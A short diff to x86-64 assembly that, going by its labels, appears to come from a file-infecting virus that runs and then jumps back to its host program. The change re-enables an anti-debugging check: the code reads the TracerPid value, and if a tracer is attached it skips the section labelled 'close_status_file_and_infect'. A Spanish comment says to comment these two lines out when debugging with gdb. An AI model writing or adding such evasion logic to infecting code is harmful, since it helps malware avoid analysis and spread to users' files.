@@ -340,8 +340,10 @@ section .text
         jmp .jump_to_host
 
     .check_tracerPid_value:
-       ; cmp byte [rdi], 0x30 ; == "0"
-       ; jne .cleanup_and_jump_to_host_1
+        ; Comentar estas 2 líneas para debug con gdb
+
+       cmp byte [rdi], 0x30 ; == "0"
+       jne .cleanup_and_jump_to_host_1
 
     .close_status_file_and_infect:
         add rsp, 0x1000
